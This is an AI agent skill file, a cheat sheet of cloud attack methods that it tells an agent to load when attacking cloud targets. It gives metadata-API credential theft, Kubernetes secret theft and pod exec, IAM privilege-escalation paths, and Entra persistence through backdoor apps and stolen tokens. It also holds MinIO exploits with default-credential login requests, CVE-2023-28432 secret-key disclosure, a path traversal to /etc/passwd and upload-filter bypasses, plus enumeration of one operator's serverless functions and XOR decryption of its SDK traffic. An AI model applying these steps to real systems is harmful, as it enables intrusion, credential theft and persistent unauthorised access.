---
name: cloud-attack-methods
description: >-
  Cloud attacks: metadata APIs, S3/K8s, AWS/Azure/GCP identity escalation, MinIO matrix, Aliyun FC, and ChengZi SDK decryption. Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-exploitation.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Cloud Attack Methods

```
=== Cloud ===
Metadata APIs: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | Aliyun 100.100.100.200
Object storage: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1 to obtain secrets/exec pods → cluster-admin
🚨Cloud identity attacks (privilege escalation and lateral movement after obtaining a key/token):
  AWS: enumerate permissions with enumerate-iam/cloudfox/ScoutSuite → pacu automatically finds privesc (18+ paths including iam:PassRole+lambda/ec2/glue) | STS AssumeRole cross-account | steal secrets from Lambda environment variables
  Azure/Entra: roadtools (roadrecon dump tenant)/AADInternals | device codes/refresh tokens | steal tokens through Managed Identity IMDS | Automation Runbook RCE | read secrets from Key Vault
  Entra post-exploitation: GraphRunner (enumerate Graph API/search email/add backdoor App) | add credentials to service principals (stealthy persistence) | abuse dynamic groups | steal PRT for lateral movement
  GCP: service-account token (metadata) | escalate through serviceAccountTokenCreator/actAs | enumerate with gcloud
🚨K8s deep dive (after obtaining cluster network/pod access): unauthenticated kubelet 10250 (/pods enumeration,/exec into any container) | unauthenticated etcd 2379 reads all secrets | anonymous API Server | overprivileged RBAC SA (kubectl auth can-i --list) | privileged pod mounts host and escapes | cloud K8s steals node identity → IMDS
🚨MinIO attack matrix:
  Fingerprint: Server: MinIO | /minio/health/live → 200 (empty body) | /minio/health/cluster → 200 | 9000(API)+9001(Console)
  Console brute force: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → requires JWT provider configuration
  CVE-2023-28432: POST /minio/health/cluster?verify (information disclosure; returns environment variables containing MINIO_SECRET_KEY)
  CVE-2023-28434: path traversal /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName (unavailable when patched)
  Anonymous access: GET /bucket-name/ → ListBucket(200)=anonymous read | PUT /bucket/file → AccessDenied(403)=anonymous write denied
  Upload bypass: application-layer sign validates the dir parameter but not its contents → can write any bucket (sign validates only cid+et+og, not dir)
  Extension bypass: .jsp;.jpg / .jsp%00.jpg passes the application blacklist but MinIO stores it as a static file (image/jpeg) and does not execute it
🚨Enumerate Aliyun FC functions (fcapp.run):
  Identify: URL contains *.cn-{region}.fcapp.run → Aliyun Function Compute (Serverless)
  Characteristics: POST returns "unauthorized method 'POST'" (405) = GET-only | 200+{"code":200,"msg":"Forbidden"} = path exists but lacks parameters
  Exploit: GET /{path}/{id}.html → 302 redirect leaks the real CDN domain+auth_key signed URL (exposes CDN domain/bucket structure/signing algorithm)
  Enumeration: different path prefixes correspond to different Apps (/mkzavakx/ vs /kpqwbcoq/) | invalid ID → 302 to qzone.qq.com/404.html (fallback)
  Path traversal: FC normalizes correctly (../ is invalid), but different function paths can be enumerated
  CDN auth_key (Kunlun CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → cracking requires privatekey | x-tengine-error exposes "denied by req auth"
  FC→CDN chain: FC function generates signed URL → kunlun/kijwsks.com CDN download | spoof referer as Baidu (mo.baidu.com)
🚨ChengZi SDK decryption:
  Initialization: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → encrypted response (base64)
  Decryption: single-byte XOR key=0x96 → JSON(channelCode/fu download URL/csu tracking URL/ph package hash)
  d3504.cn uses Cloudflare+Aliyun DDoS protection (aliyunddos)+Kunlun CDN (kunlunaq.com) → layered defenses
  Key point: fu field = real APK-download FC function URL (possibly a different region from the landing page!) | csu = click-tracking callback URL
```
